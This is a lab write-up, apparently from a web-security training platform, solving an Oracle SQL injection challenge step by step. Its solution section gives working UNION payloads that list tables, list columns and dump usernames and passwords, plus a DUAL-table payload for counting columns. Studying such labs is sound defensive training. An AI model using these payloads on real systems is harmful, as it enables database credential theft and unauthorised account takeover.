## Description:

this lab contains a SQL injection vulnerability in the product category filter, it is possible to use a UNION attack to retrieve data from other tables

the application has a login function, the database contains a table that holds usernames and passwords, the name and columns of this table must be determined then retrieved 

to solve the lab log in as *administrator*

## Solution

1.\ listing all tables in the database with *all_tables*
 
	' UNION SELECT TABLE_NAME,NULL FROM all_tables--

the response tells that a table called 'USERS_AKZKLD' which is probably what we are looking for

2.\ querying the *all_tab_columns* table for the name of all columns in *USERS_AKZKLD* table

	' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE TABLE_NAME='USERS_AKZKLD'--

the response tells that the columns present are 'USERNAME_HALJVI' and 'PASSWORD_XSZTFM'

3.\ querying the 'USERS_AKZKLD' table for the 'USERNAME_HALJVI' and 'PASSWORD_XSZTFM' columns

	 ' UNION SELECT USERNAME_HALJVI,PASSWORD_XSZTFM FROM USERS_AKZKLD--

the query returns database credentials for the user administrator, carlos and wiener

## Note:

when determining how many columns are being returned in Oracle databases it is important to remember that 
on oracle databases, every **SELECT** statement must specify a table to select **FROM**, if the **UNION SELECT** attack does not query from a table it is still needed to include the **FROM** keyword followed by a valid table name

there is a built-in name for this purpose called **DUAL**

' UNION SELECT NULL,NULL FROM DUAL--
